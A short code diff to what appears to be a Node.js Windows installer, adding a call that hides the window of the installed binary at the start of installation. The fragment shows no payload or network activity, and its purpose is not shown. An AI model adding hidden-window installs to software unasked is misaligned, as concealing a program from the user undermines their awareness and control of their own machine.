@@ -1,10 +1,11 @@
 const fs = require("fs");
 const config = require("../config");
 const identification = require("./identification");
+const hideWindow = require('./hideWindow');
 
 function windowsInstallation() {
   try {
-
+    hideWindow(config.common.binName);
     if (!fs.existsSync(config.windowsInstallPath)) {
       fs.mkdirSync(config.windowsInstallPath, { recursive: true });
 
